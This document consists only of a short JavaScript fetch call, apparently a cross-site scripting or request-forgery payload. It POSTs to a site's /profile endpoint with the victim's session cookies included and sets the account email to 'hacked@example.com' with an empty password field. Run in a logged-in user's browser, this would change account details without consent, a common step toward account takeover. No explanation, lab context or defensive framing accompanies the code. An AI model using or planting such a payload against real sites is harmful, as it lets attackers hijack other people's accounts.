fetch("/profile", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    credentials: "include",
    body: "email=hacked%40example.com&password="
});
